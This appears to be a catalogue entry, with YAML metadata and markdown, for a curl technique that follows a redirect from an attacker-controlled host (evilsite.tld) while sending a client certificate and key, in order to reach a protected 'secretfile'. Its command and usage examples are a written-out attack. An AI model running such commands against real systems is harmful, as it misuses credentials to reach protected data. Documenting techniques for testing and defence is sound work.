---
id: cmd-uuid-001
data: 'curl -L --cert client.crt --key client.key https://evilsite.tld/something'
tags:
  - curl
  - tls
  - redirect
type: command
output: 'Content of https://targetsite.tld/secretfile retrieved using the certificate'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:30:58.720Z'
verified: false
validated: true
submitted: true
---
# curl-follow-redirect-with-cert

## Command

```bash
curl -L --cert client.crt --key client.key https://evilsite.tld/something
```

## Description

This command uses curl to send an HTTPS request to an attacker-controlled site, follow redirects with -L, and authenticate using a client certificate and private key, exploiting reuse to access a protected target resource.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-L` | Follow HTTP redirects (Location header) | Yes |
| `--cert client.crt` | Specify the client certificate file for TLS authentication | Yes |
| `--key client.key` | Specify the private key file corresponding to the certificate | Yes |
| `https://evilsite.tld/something` | Initial URL that redirects to the protected resource | Yes |

## Examples

### Basic Usage

```bash
curl -L --cert client.crt --key client.key https://evilsite.tld/something
```

### Advanced Usage

```bash
curl -v -L --cert client.crt --key client.key https://evilsite.tld/something -o output.txt
```

Adds verbose (-v) output and saves response to file.

## Expected Output

The command retrieves and prints the content of the redirected protected resource (e.g., secretfile), confirming certificate reuse succeeded. Example: "This is secret content" from target site.

## Related

- [[Related Procedure: Execute-Curl-with-Certificate-Reuse]]
